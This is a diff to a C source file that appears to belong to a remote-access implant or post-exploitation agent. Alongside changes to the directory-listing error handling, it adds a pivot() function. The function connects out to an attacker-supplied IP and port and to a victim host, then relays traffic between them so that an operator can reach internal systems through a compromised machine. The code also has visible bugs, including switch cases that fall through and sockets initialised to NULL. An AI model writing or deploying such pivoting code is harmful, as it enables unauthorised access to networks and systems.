@@ -6,6 +6,9 @@
 #include "commands.h"
 #include "dbg.h"
 #include <errno.h>
+#include <netdb.h>
+#include <strings.h>
+#include <unistd.h>
 
 ArpResult* get_arp(char *argv,int argc)
 {
@@ -51,6 +54,8 @@ ArpResult* get_arp(char *argv,int argc)
     memcpy(out_result,&result,sizeof(ArpResult));
     return out_result;
 }
+
+
 int free_str_array(struct StringArray *array){
     if(array == NULL){
         return -1;
@@ -68,6 +73,8 @@ int free_str_array(struct StringArray *array){
     free(array);
     return 0;
 }
+
+
 struct StringArray * get_dir_list(char *argv,int argc){
     DIR *d = NULL;
     struct StringArray *err;
@@ -117,19 +124,105 @@ struct StringArray * get_dir_list(char *argv,int argc){
     return out;
 
     error:
-        switch(error_code){
-            case ENOENT:
-                error_message = strerror(ENOENT);
-                error_message_len = strlen(error_message);
-                check_mem(err = malloc(sizeof(struct StringArray)));
-                check_mem(err->strings = malloc(sizeof(struct String)));
-                err->count = 1;
-                check_mem(err->strings[0].string = malloc(sizeof(char) * (error_message_len+1)));
-                strcpy(err->strings[0].string,error_message);
-                err->strings[0].length = (size_t) error_message_len;
-                return err;
+        if(error_code) {
+            switch (error_code) {
+                case ENOTDIR:
+                    error_message = strerror(ENOTDIR);
+                case ENOENT:
+                    error_message = strerror(ENOENT);
+                default:
+                    if (!error_message) break;
+                    error_message_len = strlen(error_message);
+                    check_mem(err = malloc(sizeof(struct StringArray)));
+                    check_mem(err->strings = malloc(sizeof(struct String)));
+                    err->count = 1;
+                    check_mem(err->strings[0].string = malloc(sizeof(char) * (error_message_len + 1)));
+                    strcpy(err->strings[0].string, error_message);
+                    err->strings[0].length = (size_t) error_message_len;
+                    return err;
+            }
         }
         free_str_array(out);
         set_zero_errno();
         return NULL;
+}
+
+int pivot(struct PivotInput *input) {
+    ssize_t n;
+    int attacker_sockfd, target_sockfd;
+    struct sockaddr_in attacker_server_address, target_server_address;
+    attacker_sockfd = NULL;
+    target_sockfd = NULL;
+    char buffer[BUFFER_SIZE];
+    attacker_sockfd = socket(AF_INET, SOCK_STREAM,0);
+    if(attacker_sockfd < 0){
+        log_err("Attacker socket open failure");
+        set_zero_errno();
+        goto error;
+    }
+
+    attacker_server_address.sin_family = AF_INET;
+    bcopy((char *) &input->atk_ip.s_addr, (char *) &attacker_server_address.sin_addr.s_addr, sizeof(input->atk_ip.s_addr));
+    attacker_server_address.sin_port = input->atk_port;
+    if(connect(attacker_sockfd,(struct sockaddr *) &attacker_server_address, sizeof(attacker_server_address)) < 0){
+        log_err("Error connecting to attacker");
+        set_zero_errno();
+        goto error;
+    }
+    target_sockfd = socket(AF_INET, SOCK_STREAM,0);
+    if(target_sockfd < 0){
+        log_err("Target socket open failure");
+        set_zero_errno();
+        goto error;
+    }
+    target_server_address.sin_family = AF_INET;
+    bcopy((char *) &input->vktm_ip.s_addr, (char *) &target_server_address.sin_addr.s_addr, sizeof(input->vktm_ip.s_addr));
+    target_server_address.sin_port = input->vktm_port;
+    if(connect(target_sockfd,(struct sockaddr *) &target_server_address,sizeof(target_server_address)) < 0){
+        log_err("Error connecting to target");
+        set_zero_errno();
+        goto error;
+    }
+
+    while(true){
+        bzero(buffer,BUFFER_SIZE);
+        n = read(attacker_sockfd,&buffer,(BUFFER_SIZE-1));
+        if(n < 0){
+            log_err("Broken pipe (attacker)");
+            set_zero_errno();
+            goto error;
+        }
+        if(strcmp(&buffer,"exit") == 0){
+            break;
+        }
+        n = write(target_sockfd,&buffer,BUFFER_SIZE);
+        if(n < 0){
+            log_err("Broken pipe (target)");
+            set_zero_errno();
+            goto error;
+        }
+        bzero(buffer,BUFFER_SIZE);
+        n = read(target_sockfd,&buffer,(BUFFER_SIZE-1));
+        if(n < 0){
+            log_err("Broken pipe (attacker)");
+            set_zero_errno();
+            goto error;
+        }
+        n = write(attacker_sockfd,&buffer,BUFFER_SIZE);
+        if(n < 0){
+            log_err("Broken pipe (target)");
+            set_zero_errno();
+            goto error;
+        }
+    }
+
+    if (attacker_sockfd) close(attacker_sockfd);
+    if (target_sockfd) close(target_sockfd);
+
+    return 0;
+
+    error:
+        if (attacker_sockfd) close(attacker_sockfd);
+        if (target_sockfd) close(target_sockfd);
+        return -1;
 }
